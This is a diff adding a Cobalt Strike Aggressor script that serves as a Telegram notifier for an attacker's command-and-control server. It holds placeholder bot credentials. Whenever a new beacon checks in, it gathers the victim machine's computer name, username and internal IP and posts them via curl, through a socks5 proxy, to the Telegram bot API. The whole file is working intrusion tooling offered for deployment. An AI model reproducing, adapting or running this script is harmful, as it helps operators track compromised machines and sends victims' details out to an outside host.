@@ -1,0 +1,24 @@
+# author: dayu
+
+# ------------ set these config: ------------
+$bot_token = "11111111:xxxxxxxxxxxxxxxxxxxx";
+$chat_id = '-11111111'; # Write your group_id or user_id
+$teamserver_hostname = 'evi1ox'; # You will reveive message containing it
+# -------------------------------------------
+
+$tg_bot_webhookURL = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
+
+$test_message = 'this is a test message, test success';
+@curl_command = @('curl', '-x', 'socks5://127.0.0.1:7891', '-X', 'POST', '--data-urlencode', 'chat_id='.$chat_id, '--data-urlencode', 'text='.$test_message, $tg_bot_webhookURL);
+exec(@curl_command);
+
+on beacon_initial {
+    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));
+    local('$internalIP $computerName $userName');
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $message = 'Message from '.$teamserver_hostname.' Server%0aBeacon success implant Info Target:%0aComputer name : '.$computerName.'%0aUsername : '.$userName.'%0aIpaddres : '.$internalIP;
+    @curl_command = @('curl', '-x', 'socks5://127.0.0.1:7891', '-X', 'POST', '--data-urlencode', 'chat_id='.$chat_id, '--data', 'text='.$message, $tg_bot_webhookURL);
+    exec(@curl_command);
+}
